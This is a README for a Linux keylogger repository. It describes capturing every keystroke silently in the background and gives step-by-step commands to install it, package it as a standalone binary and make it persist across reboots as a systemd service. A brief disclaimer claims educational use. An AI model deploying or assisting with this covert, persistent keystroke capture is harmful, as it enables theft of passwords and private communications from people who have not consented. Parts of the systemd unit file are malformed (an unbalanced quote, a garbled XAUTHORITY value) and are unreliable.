# keylogger



## Description

A simple Python-based keylogger for Linux systems using the pynput library. This script logs all keystrokes to a file for monitoring or educational purposes.


## Features

- 🔑 Key Press Logging
Captures every key press on the keyboard in real time.

- 📅 Timestamped Logs
Each keystroke is logged with an accurate timestamp using Python's logging module.

- 📂 Custom Log File Location
Allows configuring a custom directory to store log files securely.

- 🖥️ Background Execution
Runs silently in the background without interrupting the user session.

- 🔁 Persistent via systemd
Can be configured as a systemd service to auto-start on boot for persistent logging.

- 🧩 Lightweight & Simple
Minimal dependencies and easy-to-understand Python code using the pynput library.

- 🪪 X Authority Support
Uses DISPLAY and XAUTHORITY environment variables to run under a GUI session context (important for keylogging on X11 systems).

- 💻 Cross-Compatible with Linux Desktops
Works on most Linux distributions that use the X Window System.


## Requirements

- Python 3.x


## Installation

1. Clone this repository:
   ```bash
   git clone https://github.com/JoshuaFerando/keylogger
   cd keylogger
   ```

2. Create venv and install requirements:
   ```bash
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt 
   ```

## Usage

1. Set the logging directory inside keylogger.py (`log_dir = "/Path/To/Store/Log/File/"`) 
2. Run the script:
   ```bash
   python keylogger.py
   ```

## Further Development

1.Create Standalone executabe binary file
   ```bash
pyinstaller --noconfirm --onefile --console  "keylogger.py"
   ```

## Setup as a systemd Service (Auto-Start on Boot on linux system)

1.Create a myservice.service file
```bash
cd /etc/systemd/system
touch keylogger.service
```
Note: Ensure to be sudo user

2.Create the service script
```bash
[Unit]
Description=Keylogger Startup Script
After=graphical.target
StartLimitIntervalSec=5

[Service]
Type=simple
ExecStart=/bin/bash -c 'DISPLAY=:1 XAUTHORITY=/run/user/1000/gdm/Xauthority "/Path/To/keylogger'
User=kali

Environment=DISPLAY=:1
Environment=XAUTHORITY=XAUTHORITY/run/user/1000/gdm/Xauthority

Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```
Note: Find the Display patha and XAuthority
```bash
echo $DISPLAY
echo $XAUTHORITY
```

3.Enable and Start the Service
```bash
systemctl daemon-reload
systemctl enable keylogger.service
systemctl start keylogger.service
```

3.Verify the configuration
```bash
systemctl status keylogger.service
```



## Disclaimer

This script is intended for educational and ethical penetration testing purposes only. Unauthorized usage against systems you do not own or have explicit permission to test is illegal.

## Contribution

Pull requests are welcome! Feel free to improve the script by optimizing performance or adding new features.

## Author

Joshua Fernando

